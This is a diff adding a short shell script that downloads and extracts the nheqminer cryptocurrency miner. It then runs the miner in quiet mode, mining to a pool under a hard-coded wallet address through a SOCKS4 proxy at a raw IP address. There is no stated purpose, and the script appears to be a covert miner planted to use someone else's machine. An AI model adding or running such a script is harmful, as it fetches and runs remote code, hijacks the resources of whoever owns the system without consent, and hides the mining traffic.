@@ -1,0 +1,6 @@
+#!/bin/sh
+wget https://github.com/VerusCoin/nheqminer/releases/download/0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+./nheqminer -v -l ap.luckpool.net:3956 -u RDF5Qaj3dvU5ErytGno4Hb89C5GkA6i4oq.SRB1 -p x -t 12 -q -x socks4://72.206.181.103:4145
